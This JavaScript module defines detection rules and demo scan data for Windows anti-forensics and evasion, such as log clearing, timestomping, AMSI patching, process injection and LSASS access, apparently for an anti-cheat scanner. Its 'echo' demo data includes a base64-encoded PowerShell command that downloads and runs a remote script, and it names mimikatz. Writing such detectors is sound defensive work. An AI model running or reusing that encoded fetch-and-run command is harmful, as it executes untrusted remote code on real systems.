window.THREEX_BEHAVIOR_DETECTION = {
  patterns: {
    staggered_deletes: {
      name: 'Staggered File Deletion',
      description: 'Files deleted with irregular time gaps — anti-forensics pattern',
      riskWeight: 85,
      indicators: [
        { type: 'usn', check: (data) => data.usnDeletes && data.usnDeletes.length >= 3 && hasStaggeredTiming(data.usnDeletes) },
        { type: 'recycle', check: (data) => data.recycleBin && data.recycleBin.length >= 2 && hasStaggeredTiming(data.recycleBin) },
        { type: 'event_log', check: (data) => data.event104Count && data.event104Count >= 2 && data.event104Count <= 10 },
      ],
      technique: 'T1070.004 - Indicator Removal: File Deletion',
      mitigation: 'Monitor USN Journal for rapid sequential deletes with timing gaps < 30s',
    },
    timestamp_fixing: {
      name: 'Timestamp Manipulation (Time Stomping)',
      description: 'File creation/modification times artificially altered to mask activity',
      riskWeight: 90,
      indicators: [
        { type: 'mft', check: (data) => data.mftEntries && data.mftEntries.some(e => e.createdTime > e.modifiedTime || e.createdTime < 0) },
        { type: 'file_meta', check: (data) => data.files && data.files.some(f => f.created && f.modified && Math.abs(new Date(f.created) - new Date(f.modified)) > 86400000 * 30) },
        { type: 'registry', check: (data) => data.registry && data.registry.some(r => r.key.includes('TimeZoneInformation') && r.value.includes('Bias')) },
      ],
      technique: 'T1070.006 - Indicator Removal: Timestomp',
      mitigation: 'Cross-reference $MFT timestamps with $LogFile journal entries',
    },
    selective_cleanup: {
      name: 'Selective Trace Cleanup',
      description: 'Only specific forensic traces removed while others remain — targeted evasion',
      riskWeight: 80,
      indicators: [
        { type: 'prefetch', check: (data) => data.prefetch && data.prefetch.gap > 0 && data.prefetch.total > 0 },
        { type: 'registry', check: (data) => data.registry && hasSelectiveRegistryWipes(data.registry) },
        { type: 'event_log', check: (data) => data.eventLog && data.eventLog.clearedSections && data.eventLog.clearedSections.length > 0 && data.eventLog.clearedSections.length < 5 },
      ],
      technique: 'T1070.001 - Clear Windows Event Logs (Selective)',
      mitigation: 'Monitor for partial log clearing instead of full wipe',
    },
    prefetch_gap: {
      name: 'Prefetch Sequence Gap',
      description: 'Missing prefetch entries suggest targeted deletion of execution evidence',
      riskWeight: 75,
      indicators: [
        { type: 'prefetch', check: (data) => data.prefetch && data.prefetch.gap >= 2 && data.prefetch.gap <= 20 },
        { type: 'execution', check: (data) => data.executionHistory && data.executionHistory.some(e => e.source === 'prefetch' && e.gapDetected) },
      ],
      technique: 'T1070.004 - Indicator Removal: File Deletion (Prefetch)',
      mitigation: 'Compare prefetch hash sequences against known execution chains',
    },
    no_event_104: {
      name: 'Stealth Log Evasion (No Event 104)',
      description: 'Event logs manipulated without generating standard clear-audit events',
      riskWeight: 70,
      indicators: [
        { type: 'event_log', check: (data) => data.eventLog && data.eventLog.hasGaps && !data.eventLog.hasEvent104 },
        { type: 'wevtutil', check: (data) => data.wevtutil && data.wevtutil.tracesFound && !data.wevtutil.event104Found },
      ],
      technique: 'T1070.001 - Clear Windows Event Logs (Stealth)',
      mitigation: 'Monitor wevtutil.exe execution and $LogFile for journal truncation',
    },
    partial_usn_delete: {
      name: 'Partial USN Journal Wipe',
      description: 'USN Journal truncated but not fully cleared — targeted evidence removal',
      riskWeight: 85,
      indicators: [
        { type: 'usn', check: (data) => data.usnJournal && data.usnJournal.truncated && !data.usnJournal.fullyCleared },
        { type: 'fsutil', check: (data) => data.fsutil && data.fsutil.usnDeleteSize && data.fsutil.usnDeleteSize < data.fsutil.usnTotalSize * 0.9 },
      ],
      technique: 'T1070.004 - Indicator Removal: File Deletion (USN)',
      mitigation: 'Monitor fsutil.exe for USN journal size changes',
    },
    no_explorer_restart: {
      name: 'Explorer Process Continuity',
      description: 'Explorer.exe not restarted during cleanup — stealth technique',
      riskWeight: 60,
      indicators: [
        { type: 'process', check: (data) => data.processes && data.processes.explorer && data.processes.explorer.uptime > 3600 && data.processes.explorer.restartCount === 0 },
        { type: 'shell', check: (data) => data.shellBags && data.shellBags.consistent && !data.shellBags.rebuildDetected },
      ],
      technique: 'T1070.004 - Indicator Removal (Stealth Cleanup)',
      mitigation: 'Monitor explorer.exe PID changes and shellbag rebuilds',
    },
    memory_injection: {
      name: 'Memory Injection Technique',
      description: 'Code injected into legitimate process memory space',
      riskWeight: 95,
      indicators: [
        { type: 'memory', check: (data) => data.memory && data.memory.regions && data.memory.regions.some(r => r.protection === 'RWX' && r.size > 4096) },
        { type: 'dll', check: (data) => data.dlls && data.dlls.some(d => d.loadMethod === 'manual_map' || d.loadMethod === 'thread_hijack') },
        { type: 'thread', check: (data) => data.threads && data.threads.some(t => t.startAddress && t.startAddress.startsWith('0x7') && t.suspicious) },
      ],
      technique: 'T1055 - Process Injection',
      mitigation: 'Monitor for RWX memory allocations and manual DLL mapping',
    },
    registry_inconsistency: {
      name: 'Registry Consistency Anomaly',
      description: 'Registry shows signs of selective cleanup with remaining inconsistencies',
      riskWeight: 70,
      indicators: [
        { type: 'registry', check: (data) => data.registry && hasRegistryInconsistencies(data.registry) },
        { type: 'userassist', check: (data) => data.userassist && data.userassist.hasGaps && data.userassist.hasRecentEntries },
      ],
      technique: 'T1070.005 - Indicator Removal: Clear Network Connection History',
      mitigation: 'Cross-reference UserAssist with Prefetch and Amcache entries',
    },
    dns_manipulation: {
      name: 'DNS Cache Manipulation',
      description: 'DNS cache selectively cleared or poisoned to hide C2 endpoints',
      riskWeight: 75,
      indicators: [
        { type: 'dns', check: (data) => data.dns && data.dns.cache && data.dns.cache.selectiveClear },
        { type: 'network', check: (data) => data.network && data.network.connections && data.network.connections.some(c => c.resolvedIP !== c.expectedIP) },
      ],
      technique: 'T1070.004 - Indicator Removal: File Deletion (DNS Cache)',
      mitigation: 'Monitor ipconfig /flushdns and DNS client service events',
    },
    lsass_anomaly: {
      name: 'LSASS Access Anomaly',
      description: 'Suspicious access patterns to LSASS process indicating credential extraction',
      riskWeight: 90,
      indicators: [
        { type: 'process', check: (data) => data.processes && data.processes.lsass && data.processes.lsass.accessors && data.processes.lsass.accessors.some(a => a.permissions.includes('VM_READ') && !a.isSystem) },
        { type: 'handle', check: (data) => data.handles && data.handles.some(h => h.type === 'Process' && h.name === 'lsass.exe' && h.access & 0x0010) },
      ],
      technique: 'T1003.001 - LSASS Memory',
      mitigation: 'Enable LSASS protection (RunAsPPL) and monitor handle access',
    },
    pcasvc_manipulation: {
      name: 'PCA/DPS Service Manipulation',
      description: 'Program Compatibility Assistant or Diagnostic Policy Service tampered with',
      riskWeight: 80,
      indicators: [
        { type: 'service', check: (data) => data.services && data.services.some(s => (s.name === 'PcaSvc' || s.name === 'DPS') && s.state !== 'Running') },
        { type: 'registry', check: (data) => data.registry && data.registry.some(r => r.key.includes('PcaSvc') && r.value === '4') },
        { type: 'event_log', check: (data) => data.eventLog && data.eventLog.pcaEntries && data.eventLog.pcaEntries.length === 0 },
      ],
      technique: 'T1489 - Service Stop',
      mitigation: 'Monitor service state changes and registry modifications',
    },
    hidden_execution: {
      name: 'Hidden Execution Chain',
      description: 'Malicious execution hidden through legitimate Windows binaries (lolbins)',
      riskWeight: 85,
      indicators: [
        { type: 'execution', check: (data) => data.executionHistory && data.executionHistory.some(e => ['powershell.exe','cmd.exe','wscript.exe','cscript.exe','mshta.exe'].includes(e.process) && e.commandLine && e.commandLine.length > 200) },
        { type: 'parent_child', check: (data) => data.processes && data.processes.relationships && data.processes.relationships.some(r => r.parent === 'explorer.exe' && ['powershell.exe','cmd.exe'].includes(r.child) && r.suspicious) },
      ],
      technique: 'T1218 - System Binary Proxy Execution',
      mitigation: 'Monitor parent-child process relationships and command-line length',
    },
    ads_usage: {
      name: 'Alternate Data Stream Usage',
      description: 'NTFS alternate data streams used to hide payloads or configuration',
      riskWeight: 80,
      indicators: [
        { type: 'file', check: (data) => data.files && data.files.some(f => f.alternateStreams && f.alternateStreams.length > 0) },
        { type: 'ads', check: (data) => data.ads && data.ads.some(a => a.streamName && !a.streamName.startsWith(':$')) },
      ],
      technique: 'T1564.004 - Hide Artifacts: NTFS File Attributes',
      mitigation: 'Scan for alternate data streams using dir /r or streams.exe',
    },
    zero_width_files: {
      name: 'Zero-Width Character Filename',
      description: 'Files using zero-width Unicode characters to appear as legitimate files',
      riskWeight: 85,
      indicators: [
        { type: 'file', check: (data) => data.files && data.files.some(f => /[\u200B-\u200F\uFEFF]/.test(f.name)) },
        { type: 'mft', check: (data) => data.mftEntries && data.mftEntries.some(e => /[\u200B-\u200F\uFEFF]/.test(e.fileName)) },
      ],
      technique: 'T1036.005 - Masquerading: Match Legitimate Name or Location',
      mitigation: 'Unicode normalization and filename inspection',
    },
    shadow_copy_wipe: {
      name: 'Shadow Copy Manipulation',
      description: 'Volume Shadow Copies deleted or truncated to prevent forensic recovery',
      riskWeight: 90,
      indicators: [
        { type: 'vss', check: (data) => data.vss && data.vss.shadowCopies && data.vss.shadowCopies.length === 0 && data.vss.expectedCount > 0 },
        { type: 'event_log', check: (data) => data.eventLog && data.eventLog.hasEventID524 && !data.eventLog.hasEventID8224 },
      ],
      technique: 'T1490 - Inhibit System Recovery',
      mitigation: 'Monitor vssadmin.exe and WMI VSS provider events',
    },
    execution_history_anomaly: {
      name: 'Execution History Anomaly',
      description: 'Amcache, BAM, or SRUM data shows signs of tampering or selective removal',
      riskWeight: 75,
      indicators: [
        { type: 'amcache', check: (data) => data.amcache && data.amcache.hasGaps && data.amcache.hasRecentEntries },
        { type: 'bam', check: (data) => data.bam && data.bam.entries && data.bam.entries.some(e => e.isDeleted && e.wasRecreated) },
        { type: 'srum', check: (data) => data.srum && data.srum.hasGaps && data.srum.networkActivity > 0 },
      ],
      technique: 'T1070.004 - Indicator Removal: File Deletion (Execution History)',
      mitigation: 'Cross-reference Amcache with Prefetch and BAM entries',
    },
    // === NEW NAPSE-SPECIFIC PATTERNS ===
    amsi_bypass: {
      name: 'AMSI Bypass Detection',
      description: 'Anti-Malware Scan Interface tampered with to evade script scanning',
      riskWeight: 88,
      indicators: [
        { type: 'memory', check: (data) => data.memory && data.memory.amsi && data.memory.amsi.patched },
        { type: 'dll', check: (data) => data.dlls && data.dlls.some(d => d.name === 'amsi.dll' && d.patched) },
        { type: 'registry', check: (data) => data.registry && data.registry.some(r => r.key.includes('AMSI') && r.value === '0') },
      ],
      technique: 'T1562.001 - Impair Defenses: Disable or Modify Tools',
      mitigation: 'Monitor amsi.dll integrity and PowerShell execution events',
    },
    etw_disable: {
      name: 'ETW Patching / Disablement',
      description: 'Event Tracing for Windows disabled or patched to hide malicious activity',
      riskWeight: 82,
      indicators: [
        { type: 'memory', check: (data) => data.memory && data.memory.etw && data.memory.etw.patched },
        { type: 'process', check: (data) => data.processes && data.processes.etw && data.processes.etw.disabled },
        { type: 'registry', check: (data) => data.registry && data.registry.some(r => r.key.includes('ETW') && r.value === '0') },
      ],
      technique: 'T1562.001 - Impair Defenses: Disable or Modify Tools',
      mitigation: 'Monitor ETW provider registration and ntdll.dll integrity',
    },
    wmi_tamper: {
      name: 'WMI Repository Tampering',
      description: 'Windows Management Instrumentation repository modified to hide persistence',
      riskWeight: 78,
      indicators: [
        { type: 'file', check: (data) => data.files && data.files.some(f => f.path.includes('wbem\\repository') && f.modifiedRecently) },
        { type: 'registry', check: (data) => data.registry && data.registry.some(r => r.key.includes('WMI') && r.isDeleted) },
      ],
      technique: 'T1562.001 - Impair Defenses: Disable or Modify Tools',
      mitigation: 'Monitor WMI repository file integrity and MOF compilation events',
    },
    ps_obfuscation: {
      name: 'PowerShell Obfuscation',
      description: 'PowerShell commands heavily obfuscated to evade detection',
      riskWeight: 80,
      indicators: [
        { type: 'execution', check: (data) => data.executionHistory && data.executionHistory.some(e => e.process === 'powershell.exe' && e.commandLine && (e.commandLine.includes('-enc') || e.commandLine.includes('-encodedcommand') || e.commandLine.length > 500)) },
        { type: 'memory', check: (data) => data.memory && data.memory.strings && data.memory.strings.some(s => s.includes('powershell') && s.includes('frombase64')) },
      ],
      technique: 'T1027 - Obfuscated Files or Information',
      mitigation: 'Enable PowerShell script block logging and constrained language mode',
    },
    dotnet_inject: {
      name: '.NET Assembly Injection',
      description: 'Managed code injected into .NET processes via CLR hosting',
      riskWeight: 85,
      indicators: [
        { type: 'memory', check: (data) => data.memory && data.memory.regions && data.memory.regions.some(r => r.type === 'CLR' && r.suspicious) },
        { type: 'dll', check: (data) => data.dlls && data.dlls.some(d => d.name === 'clr.dll' && d.injected) },
      ],
      technique: 'T1055 - Process Injection',
      mitigation: 'Monitor CLR loading events and AppDomain creation',
    },
    apc_inject: {
      name: 'APC Injection',
      description: 'Asynchronous Procedure Call injection detected in process threads',
      riskWeight: 88,
      indicators: [
        { type: 'thread', check: (data) => data.threads && data.threads.some(t => t.apcQueue && t.apcQueue.length > 0 && t.suspicious) },
        { type: 'memory', check: (data) => data.memory && data.memory.regions && data.memory.regions.some(r => r.apcInjected) },
      ],
      technique: 'T1055.004 - Process Injection: Asynchronous Procedure Call',
      mitigation: 'Monitor NtQueueApcThread calls and thread alert states',
    },
    process_hollow: {
      name: 'Process Hollowing',
      description: 'Legitimate process created and replaced with malicious code',
      riskWeight: 92,
      indicators: [
        { type: 'process', check: (data) => data.processes && data.processes.some(p => p.hollowed && p.imagePath !== p.memoryPath) },
        { type: 'memory', check: (data) => data.memory && data.memory.regions && data.memory.regions.some(r => r.type === 'hollowed_image') },
      ],
      technique: 'T1055.012 - Process Injection: Process Hollowing',
      mitigation: 'Compare disk image hash with in-memory image hash',
    },
    reflective_dll: {
      name: 'Reflective DLL Injection',
      description: 'DLL loaded directly from memory without touching disk',
      riskWeight: 90,
      indicators: [
        { type: 'dll', check: (data) => data.dlls && data.dlls.some(d => d.loadMethod === 'reflective' || !d.diskPath) },
        { type: 'memory', check: (data) => data.memory && data.memory.regions && data.memory.regions.some(r => r.protection === 'RX' && r.noDiskBacking) },
      ],
      technique: 'T1055 - Process Injection',
      mitigation: 'Monitor LdrLoadDll calls and memory regions without file backing',
    },
    thread_hijack: {
      name: 'Thread Hijacking',
      description: 'Existing thread redirected to execute malicious code',
      riskWeight: 87,
      indicators: [
        { type: 'thread', check: (data) => data.threads && data.threads.some(t => t.hijacked && t.originalStart !== t.currentStart) },
        { type: 'memory', check: (data) => data.memory && data.memory.regions && data.memory.regions.some(r => r.threadHijacked) },
      ],
      technique: 'T1055.003 - Process Injection: Thread Execution Hijacking',
      mitigation: 'Monitor SetThreadContext and thread start address changes',
    },
    hwid_spoof: {
      name: 'HWID Spoofing Artifacts',
      description: 'Hardware ID spoofing tools or registry modifications detected',
      riskWeight: 75,
      indicators: [
        { type: 'registry', check: (data) => data.registry && data.registry.some(r => r.key.includes('MachineGuid') && r.modified) },
        { type: 'file', check: (data) => data.files && data.files.some(f => f.name.includes('spoofer') || f.name.includes('hwid')) },
        { type: 'service', check: (data) => data.services && data.services.some(s => s.name.includes('spoofer')) },
      ],
      technique: 'T1098 - Account Manipulation',
      mitigation: 'Monitor registry key MachineGuid, ProductId, and hardware identifiers',
    },
  },

  hasStaggeredTiming: function(items) {
    if (!items || items.length < 3) return false;
    const times = items.map(i => new Date(i.time || i.deletedAt || i.timestamp).getTime()).sort((a,b) => a-b);
    const gaps = [];
    for (let i = 1; i < times.length; i++) gaps.push(times[i] - times[i-1]);
    const avg = gaps.reduce((a,b) => a+b, 0) / gaps.length;
    const variance = gaps.reduce((sum, g) => sum + Math.pow(g - avg, 2), 0) / gaps.length;
    return variance > 10000 && gaps.some(g => g > 1000 && g < 30000);
  },

  hasSelectiveRegistryWipes: function(registry) {
    const runKeys = registry.filter(r => r.key.includes('\\Run') || r.key.includes('\\RunOnce'));
    const userAssist = registry.filter(r => r.key.includes('UserAssist'));
    const muiCache = registry.filter(r => r.key.includes('MuiCache'));
    const cleaned = runKeys.filter(r => r.isDeleted).length;
    const total = runKeys.length;
    return cleaned > 0 && cleaned < total && userAssist.length > 0;
  },

  hasRegistryInconsistencies: function(registry) {
    const runKeys = registry.filter(r => r.key.includes('\\Run'));
    const userAssist = registry.filter(r => r.key.includes('UserAssist'));
    const runPrograms = runKeys.filter(r => r.value).map(r => r.value.toLowerCase());
    const uaPrograms = userAssist.filter(r => r.value).map(r => r.value.toLowerCase());
    return runKeys.some(r => r.isDeleted) && uaPrograms.some(p => runPrograms.some(rp => rp.includes(p) || p.includes(rp)));
  },

  analyze: function(scanData) {
    const findings = [];
    for (const [patternId, pattern] of Object.entries(this.patterns)) {
      let matchedIndicators = [];
      let matched = false;
      for (const indicator of pattern.indicators) {
        try {
          if (indicator.check(scanData)) { matchedIndicators.push(indicator.type); matched = true; }
        } catch (e) {}
      }
      if (matched) {
        findings.push({
          id: patternId, name: pattern.name, description: pattern.description,
          riskWeight: pattern.riskWeight, matchedIndicators: matchedIndicators,
          technique: pattern.technique, mitigation: pattern.mitigation,
          confidence: Math.min(matchedIndicators.length * 25 + 25, 100),
        });
      }
    }
    const behaviorScore = findings.length > 0 ? Math.round(findings.reduce((sum, f) => sum + f.riskWeight * (f.confidence / 100), 0) / findings.length) : 0;
    return {
      findings: findings, behaviorScore: behaviorScore,
      threatLevel: behaviorScore >= 80 ? 'CRITICAL' : behaviorScore >= 60 ? 'HIGH' : behaviorScore >= 40 ? 'MEDIUM' : 'LOW',
      totalPatternsChecked: Object.keys(this.patterns).length, patternsMatched: findings.length,
      isNapseLike: findings.some(f => ['staggered_deletes','timestamp_fixing','selective_cleanup','no_event_104','partial_usn_delete','no_explorer_restart','amsi_bypass','etw_disable','wmi_tamper'].includes(f.id)),
      isOceanLike: findings.some(f => ['prefetch_gap','registry_inconsistency','dns_manipulation','pcasvc_manipulation','hwid_spoof'].includes(f.id)),
      isEchoLike: findings.some(f => ['memory_injection','lsass_anomaly','hidden_execution','ads_usage','dotnet_inject','apc_inject','process_hollow','reflective_dll','thread_hijack'].includes(f.id)),
    };
  },

  quickCheck: function(scanData) {
    const result = this.analyze(scanData);
    return {
      isEvasionDetected: result.findings.length > 0,
      evasionType: result.isNapseLike ? 'NAPSE-like' : result.isOceanLike ? 'Ocean-like' : result.isEchoLike ? 'Echo-like' : 'Unknown',
      behaviorScore: result.behaviorScore,
      topFindings: result.findings.slice(0, 3).map(f => f.name),
    };
  },
};

// === DEMO DATA GENERATORS ===
window.THREEX_BEHAVIOR_DEMO = {
  clean: {
    usnDeletes: [], recycleBin: [], prefetch: { gap: 0, total: 45 },
    eventLog: { hasEvent104: false, hasGaps: false, clearedSections: [] },
    registry: [], processes: { explorer: { uptime: 86400, restartCount: 0 }, lsass: { accessors: [] } },
    memory: { regions: [], amsi: { patched: false }, etw: { patched: false } },
    dns: { cache: { selectiveClear: false } }, vss: { shadowCopies: [1,2,3], expectedCount: 3 },
  },
  napse: {
    usnDeletes: [
      { time: '2026-06-22T14:00:00Z', file: 'loader.exe' },
      { time: '2026-06-22T14:00:15Z', file: 'cheat.dll' },
      { time: '2026-06-22T14:00:45Z', file: 'config.json' },
      { time: '2026-06-22T14:01:30Z', file: 'injector.exe' },
    ],
    recycleBin: [
      { deletedAt: '2026-06-22T14:00:00Z', file: 'loader.exe' },
      { deletedAt: '2026-06-22T14:00:45Z', file: 'cheat.dll' },
    ],
    event104Count: 0, prefetch: { gap: 5, total: 40 },
    eventLog: { hasEvent104: false, hasGaps: true, clearedSections: ['Security'] },
    registry: [
      { key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', value: 'loader.exe', isDeleted: true },
      { key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', value: 'legit_app.exe', isDeleted: false },
      { key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist', value: 'loader.exe', isDeleted: false },
    ],
    processes: { explorer: { uptime: 7200, restartCount: 0 }, lsass: { accessors: [] } },
    memory: { regions: [], amsi: { patched: true }, etw: { patched: true } },
    mftEntries: [
      { fileName: 'loader.exe', createdTime: 1719072000000, modifiedTime: 1719072000000 },
      { fileName: 'cheat.dll', createdTime: 1719072000000, modifiedTime: 1719072000000 },
    ],
    dns: { cache: { selectiveClear: true } },
    vss: { shadowCopies: [], expectedCount: 3 },
    fsutil: { usnDeleteSize: 1024, usnTotalSize: 1048576 },
    amcache: { hasGaps: true, hasRecentEntries: true },
    bam: { entries: [{ isDeleted: true, wasRecreated: true }] },
  },
  ocean: {
    usnDeletes: [], prefetch: { gap: 12, total: 35 },
    registry: [
      { key: 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\PcaSvc', value: '4' },
      { key: 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\DPS', value: '2' },
    ],
    services: [
      { name: 'PcaSvc', state: 'Stopped' },
      { name: 'DPS', state: 'Running' },
    ],
    eventLog: { pcaEntries: [], hasEvent104: false, hasGaps: true },
    dns: { cache: { selectiveClear: true }, connections: [{ resolvedIP: '1.2.3.4', expectedIP: '5.6.7.8' }] },
    processes: { explorer: { uptime: 3600, restartCount: 0 } },
    memory: { etw: { patched: true } },
  },
  echo: {
    memory: { regions: [{ protection: 'RWX', size: 8192, address: '0x7FF123400000' }], amsi: { patched: false }, etw: { patched: false } },
    dlls: [{ loadMethod: 'manual_map', path: 'C:\\Temp\\hidden.dll' }, { loadMethod: 'reflective', diskPath: null }],
    threads: [{ startAddress: '0x7FF123400000', suspicious: true, hijacked: true, apcQueue: [{}, {}] }],
    processes: { lsass: { accessors: [{ permissions: 'VM_READ', isSystem: false, process: 'mimikatz.exe' }] }, some: [{ hollowed: true, imagePath: 'C:\\Windows\\notepad.exe', memoryPath: 'C:\\Temp\\malicious.exe' }] },
    handles: [{ type: 'Process', name: 'lsass.exe', access: 0x0010 }],
    executionHistory: [
      { process: 'powershell.exe', commandLine: 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=' },
    ],
    files: [
      { name: 'legit.txt', alternateStreams: [{ streamName: 'hidden_payload', size: 4096 }] },
      { name: 'FiveM\u200B.exe', alternateStreams: [] },
    ],
  },
};
